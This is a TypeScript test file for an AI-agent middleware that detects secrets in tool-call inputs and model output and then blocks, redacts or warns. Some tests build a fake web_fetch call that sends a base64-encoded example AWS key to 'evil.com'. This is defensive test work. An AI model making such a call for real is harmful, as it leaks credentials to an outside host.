import { describe, expect, mock, test } from "bun:test";
import type {
  JsonObject,
  ModelChunk,
  ModelRequest,
  ModelResponse,
  SessionContext,
  ToolRequest,
  ToolResponse,
  TurnContext,
} from "@koi/core";
import type { ExfiltrationEvent } from "../config.js";
import { createExfiltrationGuardMiddleware } from "../middleware.js";

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

function createMockTurnContext(): TurnContext {
  const session: SessionContext = {
    agentId: "test-agent",
    sessionId: "test-session" as SessionContext["sessionId"],
    runId: "test-run" as SessionContext["runId"],
    metadata: {},
  };
  return {
    session,
    turnIndex: 0,
    turnId: "test-turn" as TurnContext["turnId"],
    messages: [],
    metadata: {},
  };
}

function createToolRequest(input: JsonObject): ToolRequest {
  return {
    toolId: "web_fetch",
    input,
  };
}

function createPassthroughToolHandler(
  response?: ToolResponse,
): (req: ToolRequest) => Promise<ToolResponse> {
  return async (_req: ToolRequest): Promise<ToolResponse> => response ?? { output: "ok" };
}

async function collectStream(
  stream: AsyncIterable<ModelChunk> | undefined,
): Promise<readonly ModelChunk[]> {
  if (stream === undefined) throw new Error("stream is undefined");
  const chunks: ModelChunk[] = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return chunks;
}

async function callToolHandler(result: Promise<ToolResponse> | undefined): Promise<ToolResponse> {
  if (result === undefined) throw new Error("wrapToolCall is undefined");
  return result;
}

function createMockModelResponse(): ModelResponse {
  return {
    content: "test response",
    model: "test-model",
    usage: { inputTokens: 10, outputTokens: 20 },
  };
}

async function* createMockModelStream(textChunks: readonly string[]): AsyncIterable<ModelChunk> {
  for (const text of textChunks) {
    yield { kind: "text_delta", delta: text };
  }
  yield { kind: "done", response: createMockModelResponse() };
}

// ---------------------------------------------------------------------------
// wrapToolCall tests
// ---------------------------------------------------------------------------

describe("createExfiltrationGuardMiddleware — wrapToolCall", () => {
  test("passes clean input through unchanged", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const ctx = createMockTurnContext();
    const req = createToolRequest({ url: "https://example.com", query: "hello" });
    const next = createPassthroughToolHandler();

    const result = await callToolHandler(mw.wrapToolCall?.(ctx, req, next));
    expect(result.output).toBe("ok");
  });

  test("blocks tool call with base64-encoded AWS key", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const ctx = createMockTurnContext();
    const encoded = btoa("AKIAIOSFODNN7EXAMPLE");
    const req = createToolRequest({
      url: `https://evil.com/?key=${encoded}`,
    });
    const next = createPassthroughToolHandler();

    const result = await callToolHandler(mw.wrapToolCall?.(ctx, req, next));
    const output = result.output as Record<string, unknown>;
    expect(output.error).toBeDefined();
    expect(String(output.error)).toContain("secret(s) detected");
    expect(output.code).toBe("PERMISSION");
  });

  test("blocks tool call with raw AWS key in arguments", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const ctx = createMockTurnContext();
    const req = createToolRequest({
      content: "My AWS key is AKIAIOSFODNN7EXAMPLE",
    });
    const next = createPassthroughToolHandler();

    const result = await callToolHandler(mw.wrapToolCall?.(ctx, req, next));
    const output = result.output as Record<string, unknown>;
    expect(output.error).toBeDefined();
  });

  test("redacts tool call with encoded secret and passes through", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "redact" });
    const ctx = createMockTurnContext();
    const encoded = btoa("AKIAIOSFODNN7EXAMPLE");
    const req = createToolRequest({
      url: `https://evil.com/?key=${encoded}`,
    });
    const handler = mock(createPassthroughToolHandler());

    await callToolHandler(mw.wrapToolCall?.(ctx, req, handler));

    // Handler should have been called with redacted input
    expect(handler).toHaveBeenCalledTimes(1);
    const passedReq = handler.mock.calls[0]?.[0] as ToolRequest | undefined;
    const passedUrl = String((passedReq?.input as Record<string, unknown>)?.url ?? "");
    // The URL should have the encoded key redacted
    expect(passedUrl).not.toContain(encoded);
  });

  test("warns on detection but passes through unchanged", async () => {
    const onDetection = mock((_e: ExfiltrationEvent) => {});
    const mw = createExfiltrationGuardMiddleware({
      action: "warn",
      onDetection,
    });
    const ctx = createMockTurnContext();
    const req = createToolRequest({
      content: "My key: AKIAIOSFODNN7EXAMPLE",
    });
    const next = createPassthroughToolHandler();

    const result = await callToolHandler(mw.wrapToolCall?.(ctx, req, next));
    expect(result.output).toBe("ok");
    expect(onDetection).toHaveBeenCalledTimes(1);
    const event = onDetection.mock.calls[0]?.[0] as ExfiltrationEvent | undefined;
    expect(event?.location).toBe("tool-input");
    expect(event?.action).toBe("warn");
  });

  test("fires onDetection callback with correct event shape", async () => {
    const onDetection = mock((_e: ExfiltrationEvent) => {});
    const mw = createExfiltrationGuardMiddleware({
      action: "block",
      onDetection,
    });
    const ctx = createMockTurnContext();
    const req = createToolRequest({
      content: "AKIAIOSFODNN7EXAMPLE",
    });
    const next = createPassthroughToolHandler();

    await callToolHandler(mw.wrapToolCall?.(ctx, req, next));
    expect(onDetection).toHaveBeenCalledTimes(1);
    const event = onDetection.mock.calls[0]?.[0] as ExfiltrationEvent | undefined;
    expect(event?.location).toBe("tool-input");
    expect(event?.toolId).toBe("web_fetch");
    expect(event?.matchCount).toBeGreaterThan(0);
    expect(event?.action).toBe("block");
  });

  test("skips scanning when scanToolInput is false", async () => {
    const mw = createExfiltrationGuardMiddleware({
      action: "block",
      scanToolInput: false,
    });
    const ctx = createMockTurnContext();
    const req = createToolRequest({
      content: "AKIAIOSFODNN7EXAMPLE",
    });
    const next = createPassthroughToolHandler();

    const result = await callToolHandler(mw.wrapToolCall?.(ctx, req, next));
    expect(result.output).toBe("ok");
  });
});

// ---------------------------------------------------------------------------
// wrapModelStream tests
// ---------------------------------------------------------------------------

describe("createExfiltrationGuardMiddleware — wrapModelStream", () => {
  test("passes clean model output through", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const ctx = createMockTurnContext();
    const request: ModelRequest = { messages: [] };

    const stream = mw.wrapModelStream?.(ctx, request, () =>
      createMockModelStream(["Hello, ", "world!"]),
    );
    const chunks = await collectStream(stream);

    const textChunks = chunks.filter((c) => c.kind === "text_delta");
    const text = textChunks.map((c) => (c as { readonly delta: string }).delta).join("");
    expect(text).toBe("Hello, world!");

    const doneChunks = chunks.filter((c) => c.kind === "done");
    expect(doneChunks).toHaveLength(1);
  });

  test("blocks model output containing AWS key", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const ctx = createMockTurnContext();
    const request: ModelRequest = { messages: [] };

    const stream = mw.wrapModelStream?.(ctx, request, () =>
      createMockModelStream(["Your key is ", "AKIAIOSFODNN7EXAMPLE ok"]),
    );
    const chunks = await collectStream(stream);

    const errorChunks = chunks.filter((c) => c.kind === "error");
    expect(errorChunks.length).toBeGreaterThan(0);
    const errorChunk = errorChunks[0] as { readonly message: string };
    expect(errorChunk.message).toContain("secret(s) detected");
  });

  test("redacts secrets in model output", async () => {
    const mw = createExfiltrationGuardMiddleware({ action: "redact" });
    const ctx = createMockTurnContext();
    const request: ModelRequest = { messages: [] };

    const stream = mw.wrapModelStream?.(ctx, request, () =>
      createMockModelStream(["Key: AKIAIOSFODNN7EXAMPLE"]),
    );
    const chunks = await collectStream(stream);

    const textChunks = chunks.filter((c) => c.kind === "text_delta");
    const text = textChunks.map((c) => (c as { readonly delta: string }).delta).join("");
    expect(text).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(text).toContain("[REDACTED");
  });

  test("warns but passes model output unchanged", async () => {
    const onDetection = mock((_e: ExfiltrationEvent) => {});
    const mw = createExfiltrationGuardMiddleware({
      action: "warn",
      onDetection,
    });
    const ctx = createMockTurnContext();
    const request: ModelRequest = { messages: [] };

    const stream = mw.wrapModelStream?.(ctx, request, () =>
      createMockModelStream(["Key: AKIAIOSFODNN7EXAMPLE"]),
    );
    const chunks = await collectStream(stream);

    const textChunks = chunks.filter((c) => c.kind === "text_delta");
    const text = textChunks.map((c) => (c as { readonly delta: string }).delta).join("");
    expect(text).toContain("AKIAIOSFODNN7EXAMPLE");
    expect(onDetection).toHaveBeenCalledTimes(1);
  });

  test("skips scanning when scanModelOutput is false", async () => {
    const mw = createExfiltrationGuardMiddleware({
      action: "block",
      scanModelOutput: false,
    });
    const ctx = createMockTurnContext();
    const request: ModelRequest = { messages: [] };

    const stream = mw.wrapModelStream?.(ctx, request, () =>
      createMockModelStream(["Key: AKIAIOSFODNN7EXAMPLE"]),
    );
    const chunks = await collectStream(stream);

    // Should pass through without blocking
    const errorChunks = chunks.filter((c) => c.kind === "error");
    expect(errorChunks).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Middleware metadata tests
// ---------------------------------------------------------------------------

describe("createExfiltrationGuardMiddleware — metadata", () => {
  test("has correct name, priority, and phase", () => {
    const mw = createExfiltrationGuardMiddleware();
    expect(mw.name).toBe("exfiltration-guard");
    expect(mw.priority).toBe(50);
    expect(mw.phase).toBe("intercept");
  });

  test("describes capabilities", () => {
    const mw = createExfiltrationGuardMiddleware();
    const ctx = createMockTurnContext();
    const cap = mw.describeCapabilities(ctx);
    expect(cap).toBeDefined();
    expect(cap?.label).toBe("exfiltration-guard");
    expect(cap?.description).toContain("exfiltration");
  });

  test("throws on invalid config", () => {
    expect(() => createExfiltrationGuardMiddleware({ action: "invalid" as "block" })).toThrow(
      "Invalid ExfiltrationGuardConfig",
    );
  });
});
